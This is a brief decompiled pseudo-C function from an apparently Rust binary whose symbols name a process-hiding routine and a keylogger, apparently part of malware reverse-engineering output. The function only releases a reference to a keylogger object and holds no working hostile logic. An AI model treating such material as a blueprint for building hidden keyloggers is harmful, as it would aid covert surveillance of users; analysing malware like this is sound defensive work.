long long flealib::hideflea::hide_flea_process(unsigned long long a0)
{
    unsigned long long v0;  // [bp-0x8]
    unsigned long long v2;  // rax

    v0 = v2;
    v0 = a0;
    core::ptr::drop_in_place<alloc::sync::Arc<std::sync::mutex::Mutex<flealib::keylogger::Keylogger>>>(&v0);
    return v0;
}
